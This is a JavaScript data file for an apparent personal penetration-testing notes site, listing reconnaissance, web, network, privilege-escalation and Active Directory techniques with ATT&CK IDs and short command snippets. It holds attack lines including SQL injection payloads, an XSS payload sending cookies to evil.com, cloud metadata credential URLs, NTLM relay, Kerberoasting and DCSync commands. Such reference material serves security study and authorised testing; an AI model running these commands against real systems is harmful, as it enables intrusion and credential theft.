/* ============================================
   data/techniques.js
   ─────────────────────────────────────────
   YOUR OWN TECHNIQUE NOTES.
   Each note is shown on the Techniques page, on the
   page of every ATT&CK technique listed in its
   "attack" field. Tools now live in tools/ (one
   markdown file per tool), not here.

   Entry fields:
     id        — unique string
     name      — display name (UPPERCASE looks great)
     alias     — short alias / CVE / tool name
     tags      — array of tag strings
     severity  — "critical" | "high" | "medium" | "low" | "info"
     image     — path to image (optional, leave "" for placeholder)
     summary   — short description shown in modal
     notes     — code snippet, command, or key note (optional)
     attack    — ATT&CK technique IDs the note belongs to, e.g. ["T1548.003"]
                 (look one up: python3 scripts/attack_map.py --find "sudo")
     link      — URL to full write-up / docs (optional)
     group     — sub-group within a category (optional)
   ============================================ */

const TECHNIQUES = [
  {
    id: "recon",
    name: "RECONNAISSANCE",
    entries: [
      {
        id: "recon-passive-osint",
        attack: ["T1593", "T1596", "T1589"],
        name: "PASSIVE OSINT",
        alias: "Open Source Intelligence",
        tags: ["OSINT", "Passive"],
        severity: "info",
        image: "",
        summary: "Gathering publicly available information about a target without direct interaction. Includes WHOIS lookups, DNS enumeration, certificate transparency logs, and social media profiling.",
        notes: "theHarvester -d target.com -b google,linkedin,shodan\nrecon-ng -w target_workspace\namass enum -passive -d target.com",
        link: "",
        group: "Passive"
      },
      {
        id: "recon-active-scan",
        attack: ["T1595.001", "T1046"],
        name: "PORT SCANNING",
        alias: "nmap / masscan",
        tags: ["Active", "Network"],
        severity: "info",
        image: "",
        summary: "Active scanning to identify open ports, running services, and OS fingerprinting. Forms the baseline for attack surface mapping.",
        notes: "nmap -sV -sC -oA scan_out -T4 <target>\nnmap --script vuln <target>",
        link: "",
        group: "Active"
      },
      {
        id: "recon-subdomain",
        attack: ["T1590.002", "T1595.003"],
        name: "SUBDOMAIN ENUM",
        alias: "amass / subfinder",
        tags: ["DNS", "Passive", "Active"],
        severity: "info",
        image: "",
        summary: "Enumerating subdomains to expand the attack surface. Combines passive techniques (certificate transparency, OSINT) with active brute-forcing.",
        notes: "subfinder -d target.com -o subs.txt\namass enum -brute -d target.com\nffluf -w wordlist.txt -u https://FUZZ.target.com",
        link: "",
        group: "Active"
      }
    ]
  },

  {
    id: "webapp",
    name: "WEB APPLICATION",
    entries: [
      {
        id: "web-sqli",
        attack: ["T1190"],
        name: "SQL INJECTION",
        alias: "SQLi / CVE class",
        tags: ["Injection", "Database"],
        severity: "critical",
        image: "",
        summary: "Inserting malicious SQL payloads into input fields or URL parameters to manipulate backend queries. Covers error-based, blind, time-based, and union-based techniques.",
        notes: "sqlmap -u 'http://target.com/page?id=1' --dbs --batch\n' OR 1=1--\n' UNION SELECT null,table_name FROM information_schema.tables--",
        link: "",
        group: "Injection"
      },
      {
        id: "web-xss",
        attack: ["T1059.007", "T1189"],
        name: "CROSS-SITE SCRIPTING",
        alias: "XSS (Reflected/Stored/DOM)",
        tags: ["XSS", "Client-Side"],
        severity: "high",
        image: "",
        summary: "Injecting malicious client-side scripts into web pages viewed by other users. Covers reflected, stored, and DOM-based variants along with CSP bypasses.",
        notes: "<script>fetch('https://evil.com?c='+document.cookie)</script>\n\"><img src=x onerror=alert(1)>",
        link: "",
        group: "Client-Side"
      },
      {
        id: "web-ssrf",
        attack: ["T1190", "T1552.005"],
        name: "SSRF",
        alias: "Server-Side Request Forgery",
        tags: ["SSRF", "Cloud"],
        severity: "high",
        image: "",
        summary: "Forcing the server to make requests to internal services or cloud metadata endpoints (e.g. AWS IMDSv1). Commonly used to pivot into internal networks or steal IAM credentials.",
        notes: "http://169.254.169.254/latest/meta-data/iam/security-credentials/\nhttp://[::]:80/  (IPv6 bypass)\nGopher:// / file:// protocol tricks",
        link: "",
        group: "Server-Side"
      },
      {
        id: "web-idor",
        attack: ["T1190"],
        name: "IDOR",
        alias: "Insecure Direct Object Reference",
        tags: ["Access Control", "OWASP"],
        severity: "high",
        image: "",
        summary: "Manipulating object references (IDs, filenames, keys) in requests to access or modify resources belonging to other users without authorization.",
        notes: "GET /api/users/1337/data → change to /api/users/1/data\nParameter tampering in JSON body or cookies",
        link: "",
        group: "Access Control"
      }
    ]
  },

  {
    id: "network",
    name: "NETWORK ATTACKS",
    entries: [
      {
        id: "net-mitm",
        attack: ["T1557"],
        name: "MAN-IN-THE-MIDDLE",
        alias: "ARP Spoofing / SSL Strip",
        tags: ["Network", "MITM"],
        severity: "critical",
        image: "",
        summary: "Intercepting and potentially altering traffic between two parties. Covers ARP poisoning, SSL stripping, and DNS spoofing on local networks.",
        notes: "arpspoof -i eth0 -t <victim> <gateway>\nbettercap -iface eth0 -caplet http-req-dump.cap",
        link: "",
        group: "LAN"
      },
      {
        id: "net-smb",
        attack: ["T1557.001"],
        name: "SMB RELAY",
        alias: "NTLM Relay / Responder",
        tags: ["Windows", "Lateral Movement"],
        severity: "critical",
        image: "",
        summary: "Capturing and relaying NTLM authentication requests to authenticate to other machines. Particularly effective in Windows AD environments without SMB signing.",
        notes: "responder -I eth0 -dw\nntlmrelayx.py -tf targets.txt -smb2support",
        link: "",
        group: "Windows"
      }
    ]
  },

  {
    id: "privesc",
    name: "PRIVILEGE ESCALATION",
    entries: [
      {
        id: "privesc-linux-suid",
        attack: ["T1548.001"],
        name: "SUID EXPLOITATION",
        alias: "Linux PrivEsc",
        tags: ["Linux", "Local"],
        severity: "high",
        image: "",
        summary: "Abusing SUID/SGID binaries on Linux systems to execute commands as root. Reference GTFOBins for exploitation patterns per binary.",
        notes: "find / -perm -4000 -type f 2>/dev/null\n# Check GTFOBins for each result",
        link: "https://gtfobins.github.io",
        group: "Linux"
      },
      {
        id: "privesc-win-token",
        attack: ["T1134.001"],
        name: "TOKEN IMPERSONATION",
        alias: "Potato / SeImpersonate",
        tags: ["Windows", "Token"],
        severity: "critical",
        image: "",
        summary: "Abusing Windows token privileges (SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege) to escalate to SYSTEM. Potato-family exploits are the primary vector.",
        notes: "whoami /priv\n# If SeImpersonatePrivilege → PrintSpoofer, GodPotato, JuicyPotato",
        link: "",
        group: "Windows"
      },
      {
        id: "privesc-sudo",
        attack: ["T1548.003"],
        name: "SUDO ABUSE",
        alias: "sudoers misconfiguration",
        tags: ["Linux", "Sudo"],
        severity: "high",
        image: "",
        summary: "Exploiting misconfigured sudo rules to execute commands as root, including wildcard abuse, LD_PRELOAD tricks, and sudo version vulnerabilities.",
        notes: "sudo -l\n# Check sudoers for NOPASSWD entries → GTFOBins",
        link: "",
        group: "Linux"
      }
    ]
  },

  {
    id: "ad",
    name: "ACTIVE DIRECTORY",
    entries: [
      {
        id: "ad-kerberoast",
        attack: ["T1558.003"],
        name: "KERBEROASTING",
        alias: "SPN Enumeration",
        tags: ["Kerberos", "Credential Access"],
        severity: "high",
        image: "",
        summary: "Requesting Kerberos service tickets for accounts with SPNs and cracking them offline to recover plaintext passwords. Highly effective against service accounts.",
        notes: "GetUserSPNs.py -request -dc-ip <DC> domain/user:pass\nhashcat -m 13100 spn.hash rockyou.txt",
        link: "",
        group: "Credential Access"
      },
      {
        id: "ad-asreproast",
        attack: ["T1558.004"],
        name: "AS-REP ROASTING",
        alias: "Kerberos Pre-Auth Disabled",
        tags: ["Kerberos", "Credential Access"],
        severity: "high",
        image: "",
        summary: "Obtaining encrypted TGT data for users with Kerberos pre-authentication disabled, then cracking offline. Requires no prior credentials.",
        notes: "GetNPUsers.py -usersfile users.txt -request -dc-ip <DC> domain/\nhashcat -m 18200 asrep.hash rockyou.txt",
        link: "",
        group: "Credential Access"
      },
      {
        id: "ad-dcsync",
        attack: ["T1003.006"],
        name: "DCSYNC",
        alias: "secretsdump / replication abuse",
        tags: ["AD", "Domain Compromise"],
        severity: "critical",
        image: "",
        summary: "Abusing Active Directory replication permissions (DS-Replication-Get-Changes-All) to dump credential hashes for all domain accounts, including KRBTGT.",
        notes: "secretsdump.py -just-dc domain/user:pass@<DC>\nmimikatz lsadump::dcsync /user:krbtgt",
        link: "",
        group: "Domain Compromise"
      }
    ]
  }
];
